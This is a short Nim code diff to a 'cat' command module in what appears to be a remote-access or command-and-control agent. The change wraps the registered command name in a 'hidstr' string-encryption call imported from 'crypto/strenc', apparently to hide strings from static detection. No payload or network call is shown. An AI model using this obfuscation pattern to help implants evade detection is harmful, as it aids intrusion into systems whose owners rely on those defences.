@@ -1,6 +1,7 @@
 import std/[os, json, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc catExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
@@ -18,4 +19,4 @@ proc catExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initCat*() =
-  register("cat", catExecute)
+  register(hidstr("cat"), catExecute)
